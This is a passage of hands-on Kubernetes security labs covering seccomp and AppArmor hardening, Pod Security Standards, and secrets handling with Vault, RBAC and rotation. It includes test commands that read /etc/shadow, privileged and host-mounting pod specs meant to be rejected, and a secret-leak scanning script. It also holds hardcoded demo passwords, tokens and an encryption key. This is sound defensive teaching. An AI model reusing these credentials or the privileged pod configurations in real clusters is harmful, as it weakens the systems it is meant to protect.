    image: ubuntu:20.04
    command: ["/bin/bash"]
    args: ["-c", "while true; do echo 'Hardened container running'; sleep 30; done"]
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: false
      runAsNonRoot: true
      runAsUser: 1000
      capabilities:
        drop:
        - ALL
    resources:
      limits:
        memory: "128Mi"
        cpu: "100m"
      requests:
        memory: "64Mi"
        cpu: "50m"
  restartPolicy: Never
EOF

    Deploy the hardened Pod:

kubectl apply -f hardened-pod.yaml

    Verify deployment:

kubectl get pods hardened-test-pod
kubectl describe pod hardened-test-pod

Subtask 3.2: Comprehensive Security Testing

    Test basic functionality:

kubectl exec -it hardened-test-pod -- /bin/bash -c "echo 'Basic test'; whoami; pwd"

    Test file system restrictions:

# This should work (temporary files)
kubectl exec -it hardened-test-pod -- /bin/bash -c "echo 'test data' > /tmp/secure-test.txt && cat /tmp/secure-test.txt"

# This should fail (sensitive system files)
kubectl exec -it hardened-test-pod -- /bin/bash -c "cat /etc/shadow"

    Test system call restrictions:

# This should fail (blocked system calls)
kubectl exec -it hardened-test-pod -- /bin/bash -c "mount"
kubectl exec -it hardened-test-pod -- /bin/bash -c "chroot /"

    Monitor security violations:

# Check AppArmor violations
sudo dmesg | grep -i apparmor | tail -5

# Check for any audit logs
sudo journalctl -u kubelet | grep -i seccomp | tail -5

Task 4: Verification and Monitoring
Subtask 4.1: Create Monitoring Scripts

    Create a security monitoring script:

cat > monitor-security.sh << 'EOF'
#!/bin/bash

echo "=== Security Profile Monitoring ==="
echo

echo "1. AppArmor Status:"
sudo aa-status | grep containers.restricted-container
echo

echo "2. Recent AppArmor Violations:"
sudo dmesg | grep -i apparmor | tail -3
echo

echo "3. Pod Security Context:"
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext}{"\n"}{end}' | grep -E "(hardened|seccomp|apparmor)"
echo

echo "4. Running Hardened Pods:"
kubectl get pods -l app=hardened-test -o wide
echo

echo "5. Security Annotations:"
kubectl get pods hardened-test-pod -o jsonpath='{.metadata.annotations}' 2>/dev/null | grep -o 'container\.apparmor[^"]*'
echo
EOF

chmod +x monitor-security.sh

    Run the monitoring script:

./monitor-security.sh

Subtask 4.2: Performance Impact Assessment

    Create a performance test script:

cat > performance-test.sh << 'EOF'
#!/bin/bash

echo "=== Performance Impact Assessment ==="
echo

echo "Testing regular Pod performance..."
kubectl run perf-test-regular --image=ubuntu:20.04 --restart=Never -- /bin/bash -c "time ls -la /usr/bin | wc -l; sleep 5"
sleep 10

echo "Testing hardened Pod performance..."
kubectl exec hardened-test-pod -- /bin/bash -c "time ls -la /usr/bin | wc -l" 2>/dev/null || echo "Command restricted by security profiles"

echo
echo "Resource usage comparison:"
kubectl top pods 2>/dev/null || echo "Metrics server not available"

# Cleanup
kubectl delete pod perf-test-regular --ignore-not-found=true
EOF

chmod +x performance-test.sh

    Run the performance test:

./performance-test.sh

Troubleshooting Common Issues
Issue 1: seccomp Profile Not Loading

Symptoms: Pod fails to start with seccomp-related errors

Solutions:

# Check if seccomp directory exists
ls -la /var/lib/kubelet/seccomp/

# Verify profile syntax
sudo cat /var/lib/kubelet/seccomp/profiles/restricted-profile.json | jq .

# Check kubelet logs
sudo journalctl -u kubelet | grep seccomp

Issue 2: AppArmor Profile Not Enforcing

Symptoms: Restricted operations succeed when they should fail

Solutions:

# Reload AppArmor profile
sudo apparmor_parser -r /etc/apparmor.d/containers.restricted-container

# Check profile status
sudo aa-status | grep containers.restricted-container

# Verify profile syntax
sudo apparmor_parser -Q /etc/apparmor.d/containers.restricted-container

Issue 3: Pod Annotation Issues

Symptoms: AppArmor annotations not recognized

Solutions:

# Check annotation format
kubectl get pod hardened-test-pod -o yaml | grep -A5 annotations

# Verify node AppArmor support
kubectl get nodes -o jsonpath='{.items[*].status.nodeInfo.osImage}'

Cleanup

    Remove test Pods:

kubectl delete pod seccomp-test-pod apparmor-test-pod hardened-test-pod --ignore-not-found=true

    Remove AppArmor profile (optional):

sudo aa-disable /etc/apparmor.d/containers.restricted-container

    Clean up files:

rm -f seccomp-pod.yaml apparmor-pod.yaml hardened-pod.yaml
rm -f monitor-security.sh performance-test.sh

Conclusion

In this lab, you have successfully:

• Implemented seccomp profiles to restrict system calls and prevent unauthorized kernel access • Created and applied AppArmor profiles to control file system and process access at the application level • Combined multiple security mechanisms to create a comprehensive defense-in-depth strategy • Tested security profile enforcement through practical verification methods • Monitored security violations and assessed performance impact

Why This Matters: System hardening with seccomp and AppArmor is crucial for container security because it provides multiple layers of protection against privilege escalation, unauthorized system access, and potential container breakout attacks. These technologies are essential components of a robust Kubernetes security posture and are frequently tested in the Certified Kubernetes Security Specialist (CKS) certification.

Key Takeaways:

    seccomp operates at the kernel level to filter system calls
    AppArmor provides mandatory access control at the application level
    Combining multiple security profiles creates stronger protection
    Proper testing and monitoring are essential for effective security implementation
    Security hardening may have minimal performance impact when properly configured

This hands-on experience prepares you for real-world container security scenarios and advanced Kubernetes security certifications.




Lab 4: Pod Security Standards
Objectives

By the end of this lab, students will be able to:

• Understand the three Pod Security Standard levels: Privileged, Baseline, and Restricted • Configure namespace-level Pod Security Standards enforcement • Deploy pods with different security contexts and observe policy enforcement • Analyze the differences between Baseline and Restricted security policies • Troubleshoot pod deployment failures due to security policy violations • Implement security best practices for Kubernetes workloads
Prerequisites

Before starting this lab, students should have:

• Basic understanding of Kubernetes concepts (pods, namespaces, deployments) • Familiarity with YAML configuration files • Knowledge of Linux command line operations • Understanding of container security concepts • Completed previous Kubernetes security labs or equivalent experience
Lab Environment

Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes already installed. Simply click Start Lab to access your environment - no need to build your own VM or install software.

Your lab environment includes: • Ubuntu 22.04 LTS with kubectl pre-installed • Single-node Kubernetes cluster (v1.28+) • All necessary tools and permissions configured
Task 1: Understanding Pod Security Standards
Subtask 1.1: Explore Current Cluster Configuration

First, let's examine the current state of your Kubernetes cluster and understand the default security settings.

    Check cluster information:

kubectl cluster-info

    List existing namespaces:

kubectl get namespaces

    Check if Pod Security Standards are enabled:

kubectl api-versions | grep policy

Subtask 1.2: Create Test Namespaces

Create dedicated namespaces for testing different security policies.

    Create namespace for Baseline testing:

kubectl create namespace baseline-test

    Create namespace for Restricted testing:

kubectl create namespace restricted-test

    Verify namespace creation:

kubectl get namespaces | grep test

Task 2: Configure Baseline Pod Security Standard
Subtask 2.1: Apply Baseline Policy to Namespace

Configure the baseline-test namespace to enforce the Baseline Pod Security Standard.

    Create a namespace configuration file:

cat > baseline-namespace.yaml << 'EOF'
apiVersion: v1
kind: Namespace
metadata:
  name: baseline-test
  labels:
    pod-security.kubernetes.io/enforce: baseline
    pod-security.kubernetes.io/audit: baseline
    pod-security.kubernetes.io/warn: baseline
EOF

    Apply the configuration:

kubectl apply -f baseline-namespace.yaml

    Verify the policy is applied:

kubectl describe namespace baseline-test

Subtask 2.2: Test Compliant Pod Deployment

Deploy a pod that complies with the Baseline security standard.

    Create a compliant pod configuration:

cat > compliant-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: compliant-app
  namespace: baseline-test
spec:
  containers:
  - name: app
    image: nginx:1.21
    ports:
    - containerPort: 80
    securityContext:
      allowPrivilegeEscalation: false
      runAsNonRoot: true
      runAsUser: 1000
      capabilities:
        drop:
        - ALL
EOF

    Deploy the compliant pod:

kubectl apply -f compliant-pod.yaml

    Check pod status:

kubectl get pods -n baseline-test

    View pod details:

kubectl describe pod compliant-app -n baseline-test

Subtask 2.3: Test Non-Compliant Pod Deployment

Attempt to deploy a pod that violates the Baseline security standard.

    Create a privileged pod configuration:

cat > privileged-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: privileged-app
  namespace: baseline-test
spec:
  containers:
  - name: app
    image: nginx:1.21
    ports:
    - containerPort: 80
    securityContext:
      privileged: true
      runAsUser: 0
EOF

    Attempt to deploy the privileged pod:

kubectl apply -f privileged-pod.yaml

    Observe the enforcement action:

kubectl get events -n baseline-test --sort-by='.lastTimestamp'

    Check if the pod was created:

kubectl get pods -n baseline-test

Task 3: Test Various Security Contexts
Subtask 3.1: Test Host Network Access

Test a pod that attempts to use host networking.

    Create host network pod configuration:

cat > host-network-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: host-network-app
  namespace: baseline-test
spec:
  hostNetwork: true
  containers:
  - name: app
    image: nginx:1.21
    ports:
    - containerPort: 80
EOF

    Attempt deployment:

kubectl apply -f host-network-pod.yaml

    Check the result:

kubectl get pods -n baseline-test
kubectl describe pod host-network-app -n baseline-test 2>/dev/null || echo "Pod creation blocked"

Subtask 3.2: Test Volume Mounts

Test a pod with various volume mount configurations.

    Create pod with hostPath volume:

cat > hostpath-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-app
  namespace: baseline-test
spec:
  containers:
  - name: app
    image: nginx:1.21
    volumeMounts:
    - name: host-volume
      mountPath: /host-data
  volumes:
  - name: host-volume
    hostPath:
      path: /etc
      type: Directory
EOF

    Attempt deployment:

kubectl apply -f hostpath-pod.yaml

    Analyze the results:

kubectl get pods -n baseline-test
kubectl describe pod hostpath-app -n baseline-test 2>/dev/null || echo "Pod creation may be blocked"

Task 4: Upgrade to Restricted Pod Security Standard
Subtask 4.1: Configure Restricted Policy

Upgrade the namespace policy to use the Restricted Pod Security Standard.

    Update the restricted-test namespace:

cat > restricted-namespace.yaml << 'EOF'
apiVersion: v1
kind: Namespace
metadata:
  name: restricted-test
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
EOF

    Apply the restricted configuration:

kubectl apply -f restricted-namespace.yaml

    Verify the policy:

kubectl describe namespace restricted-test

Subtask 4.2: Test Previously Compliant Pod

Test if the pod that worked with Baseline policy works with Restricted policy.

    Deploy the previously compliant pod to restricted namespace:

cat > compliant-pod-restricted.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: compliant-app
  namespace: restricted-test
spec:
  containers:
  - name: app
    image: nginx:1.21
    ports:
    - containerPort: 80
    securityContext:
      allowPrivilegeEscalation: false
      runAsNonRoot: true
      runAsUser: 1000
      capabilities:
        drop:
        - ALL
EOF

    Attempt deployment:

kubectl apply -f compliant-pod-restricted.yaml

    Check the result:

kubectl get pods -n restricted-test
kubectl describe pod compliant-app -n restricted-test 2>/dev/null || echo "Pod may need additional security context"

Subtask 4.3: Create Fully Restricted-Compliant Pod

Create a pod that meets all Restricted policy requirements.

    Create a fully compliant pod:

cat > fully-compliant-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: fully-compliant-app
  namespace: restricted-test
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: nginx:1.21
    ports:
    - containerPort: 8080
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      runAsNonRoot: true
      runAsUser: 1000
      runAsGroup: 1000
      capabilities:
        drop:
        - ALL
    volumeMounts:
    - name: tmp-volume
      mountPath: /tmp
    - name: var-cache-nginx
      mountPath: /var/cache/nginx
    - name: var-run
      mountPath: /var/run
  volumes:
  - name: tmp-volume
    emptyDir: {}
  - name: var-cache-nginx
    emptyDir: {}
  - name: var-run
    emptyDir: {}
EOF

    Deploy the fully compliant pod:

kubectl apply -f fully-compliant-pod.yaml

    Verify successful deployment:

kubectl get pods -n restricted-test
kubectl describe pod fully-compliant-app -n restricted-test

Task 5: Compare Policy Enforcement
Subtask 5.1: Create Comparison Deployment

Deploy the same application configuration to both namespaces to observe differences.

    Create a test deployment:

cat > test-deployment.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: test-app
spec:
  replicas: 2
  selector:
    matchLabels:
      app: test-app
  template:
    metadata:
      labels:
        app: test-app
    spec:
      containers:
      - name: app
        image: nginx:1.21
        ports:
        - containerPort: 80
        securityContext:
          runAsUser: 1000
EOF

    Deploy to baseline namespace:

kubectl apply -f test-deployment.yaml -n baseline-test

    Deploy to restricted namespace:

kubectl apply -f test-deployment.yaml -n restricted-test

    Compare results:

echo "=== Baseline Namespace ==="
kubectl get pods -n baseline-test
echo "=== Restricted Namespace ==="
kubectl get pods -n restricted-test

Subtask 5.2: Analyze Policy Violations

Examine detailed information about policy violations.

    Check events in both namespaces:

echo "=== Baseline Namespace Events ==="
kubectl get events -n baseline-test --sort-by='.lastTimestamp'
echo "=== Restricted Namespace Events ==="
kubectl get events -n restricted-test --sort-by='.lastTimestamp'

    Get detailed pod descriptions:

kubectl describe deployment test-app -n baseline-test
kubectl describe deployment test-app -n restricted-test

Task 6: Implement Security Best Practices
Subtask 6.1: Create Secure Application Template

Create a reusable template for secure pod deployments.

    Create a secure application template:

cat > secure-app-template.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-web-app
  namespace: restricted-test
spec:
  replicas: 3
  selector:
    matchLabels:
      app: secure-web-app
  template:
    metadata:
      labels:
        app: secure-web-app
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1001
        runAsGroup: 1001
        fsGroup: 1001
        seccompProfile:
          type: RuntimeDefault
      containers:
      - name: web
        image: nginx:1.21-alpine
        ports:
        - containerPort: 8080
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          runAsNonRoot: true
          runAsUser: 1001
          runAsGroup: 1001
          capabilities:
            drop:
            - ALL
        resources:
          requests:
            memory: "64Mi"
            cpu: "250m"
          limits:
            memory: "128Mi"
            cpu: "500m"
        volumeMounts:
        - name: tmp-volume
          mountPath: /tmp
        - name: nginx-cache
          mountPath: /var/cache/nginx
        - name: nginx-run
          mountPath: /var/run
        livenessProbe:
          httpGet:
            path: /
            port: 8080
          initialDelaySeconds: 30
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /
            port: 8080
          initialDelaySeconds: 5
          periodSeconds: 5
      volumes:
      - name: tmp-volume
        emptyDir: {}
      - name: nginx-cache
        emptyDir: {}
      - name: nginx-run
        emptyDir: {}
EOF

    Deploy the secure application:

kubectl apply -f secure-app-template.yaml

    Verify deployment:

kubectl get deployment secure-web-app -n restricted-test
kubectl get pods -l app=secure-web-app -n restricted-test

Subtask 6.2: Test Application Functionality

Verify that the secure application works correctly.

    Check pod status and logs:

kubectl get pods -l app=secure-web-app -n restricted-test
kubectl logs -l app=secure-web-app -n restricted-test --tail=10

    Create a service to test connectivity:

cat > secure-app-service.yaml << 'EOF'
apiVersion: v1
kind: Service
metadata:
  name: secure-web-service
  namespace: restricted-test
spec:
  selector:
    app: secure-web-app
  ports:
  - port: 80
    targetPort: 8080
  type: ClusterIP
EOF

    Apply the service:

kubectl apply -f secure-app-service.yaml

    Test connectivity:

kubectl run test-client --rm -i --tty --image=busybox --restart=Never -n restricted-test -- wget -qO- http://secure-web-service

Task 7: Cleanup and Documentation
Subtask 7.1: Document Findings

Create a summary of your observations.

    Create a findings document:

cat > lab-findings.md << 'EOF'
# Pod Security Standards Lab Findings

## Baseline Policy Results
- Compliant pods: [List successful deployments]
- Blocked configurations: [List blocked attempts]
- Key restrictions: [Summarize main restrictions]

## Restricted Policy Results
- Additional restrictions compared to Baseline: [List differences]
- Required security contexts: [List mandatory settings]
- Impact on existing workloads: [Describe compatibility issues]

## Best Practices Identified
1. Always set runAsNonRoot: true
2. Drop all capabilities and add only necessary ones
3. Use readOnlyRootFilesystem when possible
4. Set resource limits and requests
5. Implement proper health checks

## Recommendations
- [Your recommendations for production use]
EOF

    Review your findings:

cat lab-findings.md

Subtask 7.2: Clean Up Resources

Remove the test resources created during the lab.

    Delete test pods and deployments:

kubectl delete pod --all -n baseline-test
kubectl delete pod --all -n restricted-test
kubectl delete deployment --all -n baseline-test
kubectl delete deployment --all -n restricted-test

    Delete services:

kubectl delete service --all -n baseline-test
kubectl delete service --all -n restricted-test

    Delete test namespaces (optional):

kubectl delete namespace baseline-test
kubectl delete namespace restricted-test

    Clean up configuration files:

rm -f *.yaml *.md

Troubleshooting Tips
Common Issues and Solutions

Issue: Pod creation fails with "violates PodSecurity" error Solution: Check the security context requirements for your target policy level and ensure all mandatory fields are set.

Issue: Nginx fails to start in restricted environment Solution: Ensure you're using a non-root user and providing writable volumes for temporary files.

Issue: Cannot determine if policy is enforced Solution: Check namespace labels and look for admission controller events in the cluster.

Issue: Pod Security Standards not available Solution: Verify your Kubernetes version is 1.23+ and that the feature is enabled.
Verification Commands

Use these commands to verify your configuration:

# Check namespace policy labels
kubectl get namespace <namespace-name> -o yaml | grep pod-security

# View admission controller events
kubectl get events --all-namespaces | grep -i "violates\|denied"

# Check pod security context
kubectl get pod <pod-name> -o yaml | grep -A 20 securityContext

Conclusion

In this lab, you have successfully:

• Configured Pod Security Standards at the namespace level, implementing both Baseline and Restricted policies • Tested various security contexts and observed how different policies enforce security requirements • Identified the differences between Baseline and Restricted security standards through hands-on experimentation • Created secure application templates that comply with strict security policies • Implemented security best practices including non-root execution, capability dropping, and read-only filesystems

Why This Matters: Pod Security Standards provide a standardized way to enforce security policies across Kubernetes clusters. Understanding these standards is crucial for:

    Production Security: Ensuring workloads meet organizational security requirements
    Compliance: Meeting regulatory and industry security standards
    Risk Mitigation: Reducing the attack surface of containerized applications
    Operational Excellence: Implementing consistent security practices across teams

The skills you've developed in this lab are essential for the Certified Kubernetes Security Specialist (CKS) certification and for implementing robust security practices in production Kubernetes environments. You now understand how to balance security requirements with application functionality, a critical skill for Kubernetes administrators and security professionals.





Lab 5: Securing Kubernetes Secrets
Objectives

By the end of this lab, you will be able to:

• Create and manage Kubernetes Secrets using different methods • Mount Secrets as environment variables and volumes in Pods • Integrate HashiCorp Vault with Kubernetes for external secrets management • Verify that Secrets are encrypted at rest in etcd • Implement secure access patterns for sensitive data in workloads • Configure RBAC policies for Secret access control • Understand best practices for secrets management in Kubernetes
Prerequisites

Before starting this lab, you should have:

• Basic understanding of Kubernetes concepts (Pods, Deployments, Services) • Familiarity with YAML configuration files • Basic knowledge of Linux command line operations • Understanding of encryption concepts and security principles • Previous experience with kubectl commands
Lab Environment Setup

Ready-to-Use Cloud Machines: Al Nafi provides Linux-based cloud machines with Kubernetes pre-installed. Simply click Start Lab to access your environment - no need to build your own VM or install Kubernetes from scratch.

Your lab environment includes: • Ubuntu 20.04 LTS with kubectl pre-configured • Single-node Kubernetes cluster (minikube) • HashiCorp Vault binary pre-installed • All necessary tools and dependencies
Task 1: Creating and Managing Kubernetes Secrets
Subtask 1.1: Create Secrets Using Different Methods

First, let's explore various ways to create Kubernetes Secrets.

Step 1: Verify your Kubernetes cluster is running

kubectl cluster-info
kubectl get nodes

Step 2: Create a Secret using the imperative command method

# Create a generic secret with username and password
kubectl create secret generic user-credentials \
  --from-literal=username=admin \
  --from-literal=password=supersecret123

# Verify the secret was created
kubectl get secrets
kubectl describe secret user-credentials

Step 3: Create a Secret from files

# Create files with sensitive data
echo -n 'admin' > username.txt
echo -n 'supersecret123' > password.txt

# Create secret from files
kubectl create secret generic file-credentials \
  --from-file=username.txt \
  --from-file=password.txt

# Clean up the files
rm username.txt password.txt

Step 4: Create a Secret using YAML manifest

Create a file named database-secret.yaml:

apiVersion: v1
kind: Secret
metadata:
  name: database-secret
  namespace: default
type: Opaque
data:
  # Base64 encoded values
  db-host: bXlzcWwtc2VydmVy  # mysql-server
  db-user: ZGJhZG1pbg==      # dbadmin
  db-password: bXlwYXNzd29yZA==  # mypassword

Apply the Secret:

kubectl apply -f database-secret.yaml
kubectl get secret database-secret -o yaml

Step 5: Create a TLS Secret for HTTPS

# Generate a self-signed certificate
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout tls.key -out tls.crt \
  -subj "/CN=myapp.example.com/O=myapp"

# Create TLS secret
kubectl create secret tls tls-secret \
  --cert=tls.crt \
  --key=tls.key

# Clean up certificate files
rm tls.key tls.crt

Subtask 1.2: Mount Secrets as Environment Variables

Step 1: Create a Pod that uses Secrets as environment variables

Create a file named pod-env-secrets.yaml:

apiVersion: v1
kind: Pod
metadata:
  name: secret-env-pod
spec:
  containers:
  - name: myapp
    image: nginx:1.21
    env:
    - name: DB_USERNAME
      valueFrom:
        secretKeyRef:
          name: user-credentials
          key: username
    - name: DB_PASSWORD
      valueFrom:
        secretKeyRef:
          name: user-credentials
          key: password
    - name: DATABASE_HOST
      valueFrom:
        secretKeyRef:
          name: database-secret
          key: db-host
    command: ["/bin/sh"]
    args: ["-c", "while true; do echo 'Username: '$DB_USERNAME; echo 'Host: '$DATABASE_HOST; sleep 30; done"]

Step 2: Deploy and test the Pod

kubectl apply -f pod-env-secrets.yaml

# Wait for pod to be ready
kubectl wait --for=condition=Ready pod/secret-env-pod --timeout=60s

# Check the environment variables
kubectl logs secret-env-pod
kubectl exec secret-env-pod -- env | grep -E "(DB_|DATABASE_)"

Subtask 1.3: Mount Secrets as Volumes

Step 1: Create a Pod that mounts Secrets as volumes

Create a file named pod-volume-secrets.yaml:

apiVersion: v1
kind: Pod
metadata:
  name: secret-volume-pod
spec:
  containers:
  - name: myapp
    image: nginx:1.21
    volumeMounts:
    - name: secret-volume
      mountPath: "/etc/secrets"
      readOnly: true
    - name: tls-volume
      mountPath: "/etc/tls"
      readOnly: true
    command: ["/bin/sh"]
    args: ["-c", "while true; do ls -la /etc/secrets/; ls -la /etc/tls/; sleep 30; done"]
  volumes:
  - name: secret-volume
    secret:
      secretName: user-credentials
  - name: tls-volume
    secret:
      secretName: tls-secret

Step 2: Deploy and verify the volume mounts

kubectl apply -f pod-volume-secrets.yaml

# Wait for pod to be ready
kubectl wait --for=condition=Ready pod/secret-volume-pod --timeout=60s

# Check the mounted secrets
kubectl exec secret-volume-pod -- ls -la /etc/secrets/
kubectl exec secret-volume-pod -- cat /etc/secrets/username
kubectl exec secret-volume-pod -- ls -la /etc/tls/

Task 2: Integrating HashiCorp Vault for External Secrets Management
Subtask 2.1: Set Up HashiCorp Vault in Development Mode

Step 1: Start Vault server in development mode

# Start Vault in development mode (in background)
vault server -dev -dev-root-token-id=myroot -dev-listen-address=0.0.0.0:8200 &

# Wait for Vault to start
sleep 5

# Set environment variables
export VAULT_ADDR='http://127.0.0.1:8200'
export VAULT_TOKEN='myroot'

# Verify Vault is running
vault status

Step 2: Enable and configure the KV secrets engine

# Enable KV v2 secrets engine
vault secrets enable -path=secret kv-v2

# Store some secrets
vault kv put secret/myapp/config \
  username=vaultuser \
  password=vaultpass123 \
  api_key=abc123xyz789

vault kv put secret/myapp/database \
  host=vault-db.example.com \
  port=5432 \
  database=myappdb

# Verify secrets are stored
vault kv get secret/myapp/config
vault kv get secret/myapp/database

Subtask 2.2: Configure Kubernetes Authentication in Vault

Step 1: Enable Kubernetes authentication

# Enable Kubernetes auth method
vault auth enable kubernetes

# Get Kubernetes cluster information
KUBE_CA_CERT=$(kubectl config view --raw --minify --flatten -o jsonpath='{.clusters[].cluster.certificate-authority-data}' | base64 --decode)
KUBE_HOST=$(kubectl config view --raw --minify --flatten -o jsonpath='{.clusters[].cluster.server}')

# Configure Kubernetes authentication
vault write auth/kubernetes/config \
  token_reviewer_jwt="$(kubectl create token default)" \
  kubernetes_host="$KUBE_HOST" \
  kubernetes_ca_cert="$KUBE_CA_CERT"

Step 2: Create Vault policies and roles

# Create a policy for reading secrets
vault policy write myapp-policy - <<EOF
path "secret/data/myapp/*" {
  capabilities = ["read"]
}
EOF

# Create a Kubernetes role
vault write auth/kubernetes/role/myapp \
  bound_service_account_names=vault-auth \
  bound_service_account_namespaces=default \
  policies=myapp-policy \
  ttl=1h

Subtask 2.3: Deploy Vault Agent for Secret Injection

Step 1: Create a ServiceAccount for Vault authentication

kubectl create serviceaccount vault-auth

Step 2: Create a ConfigMap for Vault Agent configuration

Create a file named vault-agent-config.yaml:

apiVersion: v1
kind: ConfigMap
metadata:
  name: vault-agent-config
data:
  vault-agent.hcl: |
    vault {
      address = "http://127.0.0.1:8200"
    }
    
    auto_auth {
      method "kubernetes" {
        mount_path = "auth/kubernetes"
        config = {
          role = "myapp"
        }
      }
      
      sink "file" {
        config = {
          path = "/vault/secrets/token"
        }
      }
    }
    
    template {
      source      = "/vault/config/app-config.tpl"
      destination = "/vault/secrets/app-config"
    }
  
  app-config.tpl: |
    {{- with secret "secret/data/myapp/config" -}}
    USERNAME={{ .Data.data.username }}
    PASSWORD={{ .Data.data.password }}
    API_KEY={{ .Data.data.api_key }}
    {{- end }}
    {{- with secret "secret/data/myapp/database" -}}
    DB_HOST={{ .Data.data.host }}
    DB_PORT={{ .Data.data.port }}
    DB_NAME={{ .Data.data.database }}
    {{- end }}

Apply the ConfigMap:

kubectl apply -f vault-agent-config.yaml

Step 3: Create a Pod with Vault Agent sidecar

Create a file named vault-sidecar-pod.yaml:

apiVersion: v1
kind: Pod
metadata:
  name: vault-sidecar-pod
spec:
  serviceAccountName: vault-auth
  containers:
  - name: vault-agent
    image: vault:1.15.2
    command: ["vault", "agent", "-config=/vault/config/vault-agent.hcl"]
    volumeMounts:
    - name: vault-config
      mountPath: /vault/config
    - name: vault-secrets
      mountPath: /vault/secrets
    env:
    - name: VAULT_ADDR
      value: "http://127.0.0.1:8200"
  
  - name: myapp
    image: nginx:1.21
    command: ["/bin/sh"]
    args: ["-c", "while true; do echo '=== Vault Secrets ==='; cat /vault/secrets/app-config 2>/dev/null || echo 'Secrets not ready yet'; sleep 10; done"]
    volumeMounts:
    - name: vault-secrets
      mountPath: /vault/secrets
      readOnly: true
  
  volumes:
  - name: vault-config
    configMap:
      name: vault-agent-config
  - name: vault-secrets
    emptyDir: {}

Step 4: Deploy and verify the Vault integration

kubectl apply -f vault-sidecar-pod.yaml

# Wait for pod to be ready
kubectl wait --for=condition=Ready pod/vault-sidecar-pod --timeout=120s

# Check the logs to see secrets being retrieved
kubectl logs vault-sidecar-pod -c myapp
kubectl logs vault-sidecar-pod -c vault-agent

Task 3: Verifying Secrets Encryption at Rest
Subtask 3.1: Check etcd Encryption Configuration

Step 1: Examine the Kubernetes API server configuration

# Check if encryption at rest is enabled (in minikube)
kubectl get pods -n kube-system | grep kube-apiserver

# Get the API server configuration
kubectl describe pod -n kube-system $(kubectl get pods -n kube-system | grep kube-apiserver | awk '{print $1}')

Step 2: Create an encryption configuration for demonstration

Create a file named encryption-config.yaml:

apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
- resources:
  - secrets
  providers:
  - aescbc:
      keys:
      - name: key1
        secret: c2VjcmV0IGlzIHNlY3VyZQ==
  - identity: {}

Note: In a production environment, you would configure this in the API server startup parameters.
Subtask 3.2: Verify Secret Storage and Access

Step 1: Create a test secret and examine its storage

# Create a test secret
kubectl create secret generic test-encryption \
  --from-literal=data="This is sensitive information"

# Get the secret in different formats
kubectl get secret test-encryption -o yaml
kubectl get secret test-encryption -o jsonpath='{.data.data}' | base64 --decode

Step 2: Implement RBAC for Secret access control

Create a file named secret-rbac.yaml:

apiVersion: v1
kind: ServiceAccount
metadata:
  name: secret-reader
  namespace: default
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: secret-reader-role
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list"]
  resourceNames: ["user-credentials", "database-secret"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: secret-reader-binding
  namespace: default
subjects:
- kind: ServiceAccount
  name: secret-reader
  namespace: default
roleRef:
  kind: Role
  name: secret-reader-role
  apiGroup: rbac.authorization.k8s.io

Apply the RBAC configuration:

kubectl apply -f secret-rbac.yaml

Step 3: Test RBAC restrictions

# Test access with the service account
kubectl auth can-i get secrets --as=system:serviceaccount:default:secret-reader
kubectl auth can-i get secret/user-credentials --as=system:serviceaccount:default:secret-reader
kubectl auth can-i delete secrets --as=system:serviceaccount:default:secret-reader

Subtask 3.3: Implement Secret Rotation

Step 1: Create a script for secret rotation

Create a file named rotate-secret.sh:

#!/bin/bash

SECRET_NAME="user-credentials"
NEW_PASSWORD=$(openssl rand -base64 32)

echo "Rotating password for secret: $SECRET_NAME"
echo "New password: $NEW_PASSWORD"

# Update the secret
kubectl patch secret $SECRET_NAME -p="{\"data\":{\"password\":\"$(echo -n $NEW_PASSWORD | base64 -w 0)\"}}"

echo "Secret rotation completed"
kubectl get secret $SECRET_NAME -o jsonpath='{.data.password}' | base64 --decode
echo ""

Make it executable and run:

chmod +x rotate-secret.sh
./rotate-secret.sh

Step 2: Verify the rotation worked

# Check if pods using the secret need to be restarted
kubectl get pods -o wide

# Restart pods to pick up new secret values
kubectl delete pod secret-env-pod secret-volume-pod
kubectl apply -f pod-env-secrets.yaml
kubectl apply -f pod-volume-secrets.yaml

# Verify new secret values are being used
kubectl wait --for=condition=Ready pod/secret-env-pod --timeout=60s
kubectl exec secret-env-pod -- env | grep DB_PASSWORD

Task 4: Advanced Security Practices
Subtask 4.1: Implement Secret Scanning

Step 1: Create a script to scan for potential secret leaks

Create a file named secret-scanner.sh:

#!/bin/bash

echo "Scanning for potential secret leaks..."

# Check for secrets in environment variables
echo "=== Checking environment variables ==="
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{range .spec.containers[*]}{.env[*].name}{": "}{.env[*].value}{"\n"}{end}{"\n"}{end}' | grep -i -E "(password|secret|key|token)" || echo "No plain text secrets found in env vars"

# Check for secrets in pod specifications
echo "=== Checking pod specifications ==="
kubectl get pods -o yaml | grep -i -E "(password|secret|key|token):" | grep -v "secretKeyRef" || echo "No plain text secrets found in pod specs"

echo "Secret scan completed"

Make it executable and run:
